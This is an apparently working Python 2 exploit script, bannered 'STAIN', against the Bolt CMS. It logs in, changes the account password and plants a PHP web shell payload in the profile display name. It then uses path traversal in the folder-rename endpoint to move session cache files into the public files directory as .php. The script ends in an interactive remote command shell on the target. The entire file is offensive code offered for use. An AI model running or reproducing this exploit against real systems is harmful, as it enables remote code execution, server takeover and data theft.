#!/usr/bin/env python

import requests
import sys
import re
from bs4 import BeautifulSoup

s = requests.Session()

def login():
	login_url = url+'/bolt/login'
	get_token = s.get(login_url)

	soup = BeautifulSoup(get_token.text, 'html.parser')
	token = soup.findAll('input')[2].get("value")
	
	data = {"user_login[username]": username, 
	"user_login[password]": password,
	"user_login[login]": "",
	"user_login[_token]": token
	}
	req = s.post(login_url, data=data)
	if "You've been logged on successfully." in req.text:
		return "[+] Step1 Success, Login Success"
	else:
		return "[+] Step1 Failed"
	
def update_profile():
	point_url = url+'/bolt/profile'
	get_token = s.get(point_url)
	soup = BeautifulSoup(get_token.content, 'html.parser')
	token = soup.findAll('input')[6].get("value")
	data = {
	"user_profile[password][first]":"password",
	"user_profile[password][second]":"password",
	"user_profile[email]":"stain@stain.com",
	"user_profile[displayname]":"<?php system($_GET['cmd']);?>",
	"user_profile[save]":"",
	"user_profile[_token]":token
	}
	req = s.post(point_url, data=data)
	if "has been saved" in req.text:
		return "[+] Step2 Success, password changed to password"
	else:
		return "[+] Step2 Failed"

def exploit():
	point_url = url+'/async/folder/rename'
	cache_csrf = s.get(url+"/bolt/overview/showcases")

	soup = BeautifulSoup(cache_csrf.text, 'html.parser')
	csrf = soup.findAll('div')[12].get("data-bolt_csrf_token")

	asyncc = s.get(url+"/async/browse/cache/.sessions?multiselect=true")
	soup2 = BeautifulSoup(asyncc.text, 'html.parser')
	tables = soup2.find_all('span', class_ = 'entry disabled')

	for i in tables:
		all_tables = i.text
		all_tables_array = all_tables.split('\n')

		for oldname in all_tables_array:

			renamePostData = {
			"namespace": "root",
			"parent": "/app/cache/.sessions",
			"oldname": oldname,
			"newname": "../../../public/files/stain{}.php".format(oldname),
			"token": csrf
			  }
			rename = s.post(point_url, data=renamePostData)
			
			find_shell = s.get(url+"/files/stain{}.php?cmd=ls%20-lah".format(oldname))

			have_a_shell = False

			if "php" in find_shell.text:
				shell = "stain{}.php".format(oldname)
				print "[+] Step3 Success, Searching Shell \n=============== \n[{} found] \n===============".format(shell)
				del have_a_shell
				have_a_shell = True
				return have_a_shell, shell
			else:
				return "[+] Step3 Failed"

def have_shell(have_a_shell, shell):
	if have_a_shell == True:
		while True:
			command = str(raw_input("cmd !> "))
			if command == 'exit':
				sys.exit
			else:
				send_command = s.get(url+"/files/{}?cmd={}".format(shell,command))
				response = re.search('displayname";s:29:"(.*?)"',send_command.text, re.DOTALL).group(1)
				print(response.strip())


STAIN = """
--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------
"""

if __name__ == "__main__":
	
	try:
		print STAIN
		url = raw_input("URL: ")
		username = raw_input("Username: ")
		password = raw_input("password: ")
		print login()
		print update_profile()
		have_a_shell,shell = exploit()
		have_shell(have_a_shell, shell)
	except:
		print "Bye"